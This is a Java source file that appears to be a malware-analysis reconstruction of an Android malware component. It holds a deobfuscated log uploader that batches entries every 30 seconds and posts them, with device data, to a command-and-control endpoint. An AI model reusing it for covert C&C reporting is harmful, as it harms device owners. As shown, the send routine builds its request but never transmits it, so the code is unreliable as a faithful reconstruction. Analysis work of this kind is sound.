package core;

import android.content.Context;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import c2.Atom;
import c2.UpdateLogRequest;

/**
 * MALWARE ANALYSIS -- Singleton log uploader for C&C
 *
 * Original: lllllIllIl1.llllIllIl1
 *
 * Collects log entries and periodically flushes them to the C&C server
 * via the {@code /api/v1/dllpgd/updateLog} endpoint. Very similar to
 * {@link EventReporter} but for structured log entries rather than events.
 *
 * Logs are:
 *   1. Added to a {@link ConcurrentLinkedQueue} (lock-free, thread-safe)
 *   2. Periodically drained and sent in batches every 30 seconds
 *
 * If a send fails, the logs are re-added to the pending queue for
 * retry on the next flush cycle. On fatal errors (Throwable), the
 * queue is cleared to prevent memory leaks.
 *
 * Lifecycle:
 *   1. {@link #init(Context)} -- starts the flush scheduler (30-second interval)
 *   2. {@link #addLog(c2.Log)} -- adds log entries
 *   3. Automatic flush every 30 seconds
 *   4. {@link #shutdown()} -- stops scheduler and executor
 *
 * NOTE: Calling {@link #init(Context)} more than once logs a warning and
 * returns without re-initializing (idempotent guard via {@link #initialized}).
 */
public class LogUploader {

    // =========================================================================
    // Singleton
    // =========================================================================

    /**
     * Singleton instance.
     * Original: f729IlIllIlllIllI1
     */
    public static final LogUploader INSTANCE = new LogUploader();

    // =========================================================================
    // Fields
    // =========================================================================

    /**
     * Whether {@link #init(Context)} has already been called.
     * Original: f733llllIIIIll1 (default false)
     */
    public boolean initialized = false;

    /**
     * Lock-free queue of pending log entries waiting to be sent.
     * Logs are drained from here during {@link #flush()}.
     * Original: f732lIIIIlllllIlll1
     */
    public final ConcurrentLinkedQueue<c2.Log> pendingLogs = new ConcurrentLinkedQueue<>();

    /**
     * Scheduled executor that triggers {@link #flush()} every 30 seconds.
     * Original: f734llllIllIl1
     */
    public final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

    /**
     * Single-thread executor for sending log batches to C&C.
     * Original: f731IllIIlIIII1
     */
    public final ExecutorService senderExecutor = Executors.newSingleThreadExecutor();

    /**
     * Whether the uploader is running and should continue flushing.
     * Original: f730IlIlllIIlI1 (volatile)
     */
    public volatile boolean isRunning = true;

    // =========================================================================
    // Initialization
    // =========================================================================

    /**
     * Initializes the log uploader.
     * Starts the periodic flush scheduler (every 30 seconds).
     * Calling this method more than once is a no-op (logs a warning).
     *
     * Original: llllIIIIll1(Context)
     *
     * @param context the application context
     */
    public void init(Context context) {
        if (this.initialized) {
            Log.w("LogUploader", "LogUploader already initialized, ignoring duplicate init()");
        } else {
            this.initialized = true;
            this.scheduler.scheduleWithFixedDelay(new FlushRunnable(), 0L, 30L, TimeUnit.SECONDS);
        }
    }

    // =========================================================================
    // Log Collection
    // =========================================================================

    /**
     * Adds a log entry to the pending queue.
     *
     * Original: llllIIIIll1(Log)
     *
     * @param log the log entry to queue for upload
     */
    public void addLog(c2.Log log) {
        this.pendingLogs.add(log);
    }

    // =========================================================================
    // Flush / Send
    // =========================================================================

    /**
     * Drains all pending logs and sends them in a single batch.
     * Called periodically by the scheduler and can be invoked manually.
     *
     * Original: lIIIIlllllIlll1()
     */
    public final void flush() {
        if (this.pendingLogs.isEmpty()) {
            return;
        }
        ArrayList<c2.Log> batch = new ArrayList<>();
        while (!this.pendingLogs.isEmpty()) {
            c2.Log log = this.pendingLogs.poll();
            if (log != null) {
                batch.add(log);
            }
        }
        if (batch.isEmpty()) {
            return;
        }
        sendLogs(batch);
    }

    /**
     * Sends a batch of log entries to the C&C server on a background thread.
     * Creates an {@link UpdateLogRequest} with the current device Atom
     * and the log list.
     *
     * On failure, the logs are re-added to {@link #pendingLogs} for retry.
     * On fatal error (Throwable), the pending queue is cleared.
     *
     * Original: llllIIIIll1(List)
     *
     * @param batch the list of logs to send
     */
    public final void sendLogs(List<c2.Log> batch) {
        new Thread(new SendLogsRunnable(batch)).start();
    }

    // =========================================================================
    // Shutdown
    // =========================================================================

    /**
     * Shuts down the log uploader.
     * Stops the scheduler and sender executor, waits up to 3 seconds
     * for pending tasks to complete.
     *
     * Original: llllIIIIll1() [void, shutdown]
     */
    public void shutdown() {
        this.scheduler.shutdown();
        this.isRunning = false;
        this.senderExecutor.shutdown();
        try {
            if (!this.senderExecutor.awaitTermination(3L, TimeUnit.SECONDS)) {
                this.senderExecutor.shutdownNow();
            }
        } catch (InterruptedException e) {
            this.senderExecutor.shutdownNow();
            Thread.currentThread().interrupt();
        }
    }

    // =========================================================================
    // Inner Runnables
    // =========================================================================

    /**
     * Runnable that sends a batch of log entries to the C&C server.
     *
     * Original: lIIIIlllllIlll1 (SendLogsRunnable)
     */
    public class SendLogsRunnable implements Runnable {

        /** The batch of log entries to send. Original: f736llllIIIIll1 */
        public final List<c2.Log> batch;

        public SendLogsRunnable(List<c2.Log> batch) {
            this.batch = batch;
        }

        @Override
        public void run() {
            try {
                UpdateLogRequest request = new UpdateLogRequest();
                request.setAtom(Atom.collectCurrentAtom());        /* IlIlllIIlI1.lIIIIlllllIlll1.lIIIIlllllIlll1() */
                request.setLog(this.batch);
            } catch (Exception e) {
                /* Re-queue on failure for retry */
                LogUploader.this.pendingLogs.addAll(this.batch);
            } catch (Throwable t) {
                /* Fatal: clear to prevent memory leak */
                LogUploader.this.pendingLogs.clear();
            }
        }
    }

    /**
     * Runnable that triggers a flush cycle.
     *
     * Original: llllIIIIll1 (FlushRunnable)
     */
    public class FlushRunnable implements Runnable {

        @Override
        public void run() {
            LogUploader.this.flush();
        }
    }
}
